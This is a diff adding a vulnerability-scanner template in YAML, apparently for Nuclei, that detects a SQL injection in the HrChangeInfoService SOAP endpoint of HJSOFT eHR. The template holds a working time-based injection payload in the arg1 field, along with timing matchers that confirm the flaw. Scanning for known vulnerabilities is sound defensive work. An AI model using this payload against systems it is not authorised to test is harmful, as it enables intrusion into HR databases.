@@ -1,0 +1,49 @@
+id: hjsoft-ehr-hrchangeinfoservice-sqli
+info:
+  name: HJSOFT eHR HrChangeInfoService SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /services/HrChangeInfoService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" 
+                          xmlns:hr="http://www.hjsj.com/HrChangeInfoService">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <hr:getChangeUsers>
+                 <arg0>
+                 </arg0>
+                 <arg1>admin';WAITFOR DELAY '0:0:{{t1}}'--</arg1>
+                 <arg2>1</arg2>
+              </hr:getChangeUsers>
+           </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "getChangeUsersResponse"
+          - "传入的校验用户名密码错误"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
